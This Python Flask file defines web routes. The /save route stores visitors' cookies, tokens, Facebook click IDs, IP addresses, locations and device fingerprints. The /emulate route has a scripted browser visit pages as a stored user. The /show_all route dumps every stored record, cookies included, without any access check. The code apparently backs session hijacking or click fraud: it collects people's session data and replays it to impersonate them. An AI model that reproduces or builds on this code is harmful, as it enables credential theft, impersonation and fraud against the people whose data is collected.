import logging
import traceback
from urllib.parse import unquote

from flask import request, render_template

from app import app, db, page_visitor
from app.models import UserInfo, LogMessage


logging.basicConfig(filename='log.log', level=logging.DEBUG, format='%(asctime)s %(message)s')


def save_log(module_name, level, message):
    log_entry = LogMessage(module_name, level, message)
    db.session.add(log_entry)
    db.session.commit()


@app.route('/save', methods=['GET', 'POST'])
def save():
    if request.method == 'POST':
        try:
            user_data = request.form
            save_log("Save", "INFO", "Got user data: \n" + str(user_data))
            if user_data:
                print(user_data)
                if user_data["fbclid"]:
                    fbclid = user_data["fbclid"]
                else:
                    fbclid = ""
                if user_data["key"]:
                    key = user_data["key"]
                else:
                    key = ""
                if user_data["vmc"]:
                    vmc = user_data["vmc"]
                else:
                    vmc = ""
                if user_data["token"]:
                    token = user_data["token"]
                else:
                    token = ""
                if user_data["cookies"]:
                    cookies = user_data["cookies"]
                else:
                    cookies = ""
                if user_data["screen[width]"]:
                    screen_width = int(user_data["screen[width]"])
                    print(f"screen_width: {screen_width}")
                else:
                    screen_width = 0
                if user_data["screen[height]"]:
                    screen_height = int(user_data["screen[height]"])
                    print(f"screen_height: {screen_height}")
                else:
                    screen_height = ""
                if user_data["useragent"]:
                    useragent = unquote(user_data["useragent"]).replace("+", " ")
                else:
                    useragent = ""
                if user_data["browser"]:
                    browser = user_data["browser"].replace("+", " ")
                else:
                    browser = ""
                if user_data["browser_ver"]:
                    browser_ver = user_data["browser_ver"]
                else:
                    browser_ver = ""
                if user_data["os"]:
                    os_ = user_data["os"].replace("+", " ")
                else:
                    os_ = ""
                if user_data["os_version"]:
                    os_version = user_data["os_version"]
                else:
                    os_version = ""
                if user_data["domain"]:
                    domain = user_data["domain"]
                else:
                    domain = ""
                if user_data["link"]:
                    link = user_data["link"]
                else:
                    link = ""
                if user_data["rma"]:
                    rma = user_data["rma"]
                else:
                    rma = ""
                if user_data["device_brand"]:
                    device_brand = user_data["device_brand"]
                else:
                    device_brand = ""
                if user_data["device_model"]:
                    device_model = user_data["device_model"].replace("+", " ")
                else:
                    device_model = ""
                if user_data["device_type_lang"]:
                    device_type_lang = user_data["device_type_lang"].replace("+", " ")
                else:
                    device_type_lang = ""
                if user_data["ip"]:
                    ip = user_data["ip"]
                else:
                    ip = ""
                if user_data["isp"]:
                    isp = user_data["isp"]
                else:
                    isp = ""
                if user_data["lang"]:
                    lang = user_data["lang"]
                else:
                    lang = ""
                if user_data["country"]:
                    country = user_data["country"]
                else:
                    country = ""
                if user_data["city"]:
                    city = user_data["city"].replace("+", " ")
                else:
                    city = ""
                if user_data["operator"]:
                    operator = user_data["operator"]
                else:
                    operator = ""
                if user_data["region"]:
                    region = user_data["region"]
                else:
                    region = ""
                if key == "":
                    save_log("Save", "ERROR", "Cant create user with empty key")
                    return "Can't create user info without key"
                user_info = UserInfo(fbclid, key, vmc, token, cookies, screen_width, screen_height, useragent, browser,
                                     browser_ver, os_, os_version, device_brand, device_model, device_type_lang, domain,
                                     link, rma, ip, isp, lang, country, city, operator, region)
                print(user_info)
                db.session.add(user_info)
                db.session.commit()
                if user_info.id is not None:
                    save_log("Save", "INFO", f"User {key} successfully created with ID {user_info.id}")
                    return f"User {key} successfully saved."
                else:
                    save_log("Save", "ERROR",
                             f"Got some error while creating user with key {key}. (Source link: {user_info.link})")
            else:
                save_log("Save", "ERROR", f"Got error parsing user info")
                return f"Error parsing user info"
        except Exception:
            save_log("Save", "ERROR", f"Got error parsing & saving user info: {traceback.format_exc()}")
    else:
        save_log("Save", "ERROR", f"Got GET request instead of POST")
        return "<html><body><h1>WEBSERVICE</h1></body></html>"


@app.route("/emulate", methods=['POST'])
def emulate():
    def save_vmc(user, value):
        if user.used_vmc is None:
            user.used_vmc = value
        else:
            user.used_vmc += f",{value}"
        db.session.commit()

    def check_vmc(user, value):
        if user.used_vmc is None:
            return False
        else:
            if value in user.used_vmc.split(","):
                return True
            else:
                return False

    key = request.args.get('key')
    vmc = request.args.get('vmc')
    xcn = request.args.get('xcn')
    save_log("Emulate", "INFO", f"Got parameters: key={key}, vmc={vmc}, xcn={xcn}")
    logging.info(f"Got parameters: key={key}, vmc={vmc}, xcn={xcn}")
    if key is not None and vmc is not None and xcn is not None:
        user_data = UserInfo.query.filter(UserInfo.key == key).first()
        logging.info(f"Found User: {user_data}")
        print(key, vmc, xcn)
        print(f"User {key}:\n", user_data)
        if user_data is not None:
            save_log("Emulate", "INFO", f"Found User: {user_data}")
            if check_vmc(user_data, vmc) is False:
                visit = page_visitor.Browser().visit_page(user_data, vmc=vmc, xcn=xcn)
                if visit is True:
                    save_log("Emulate", "INFO", f"User {key} successfully visited page.")
                    save_vmc(user_data, vmc)
                    return "Page successfully visited."
                else:
                    save_log("Emulate", "ERROR", f"User {key} not visited page. (Source link: {user_data.link}")
                    return "Page not visited."
            else:
                save_log("Emulate", "ERROR", f"User {key} not visited page. This vmc ({vmc}) is already used.")
                return f"Page not visited. This vmc ({vmc}) is already used."
        else:
            save_log("Emulate", "ERROR", f"Can't visit page: User not found.")
            return "User not found."
    else:
        msg = "Can't visit page: "
        if key is None:
            msg += "<key> is empty "
        if vmc is None:
            msg += "<vmc> is empty "
        if xcn is None:
            msg += "<xcn> is empty"
        save_log("Emulate", "ERROR", msg)
        return "Page not visited."


@app.route("/show_all", methods=['GET', 'POST'])
def show_all():
    # UserInfo.query.delete()
    all_users = UserInfo.query.all()
    userslist = ""
    for user in all_users:
        userslist += "<p>" + str(user) + "</p>" + "<p>" + str(user.cookies) + "</p>"
        print(user.cookies)
    return f"<html><body>{userslist}</body></html>"


@app.route("/show_log", methods=['GET', 'POST'])
def show_log():
    logs = LogMessage.query.order_by(-LogMessage.id).all()
    return render_template("logs.html", logs=logs)
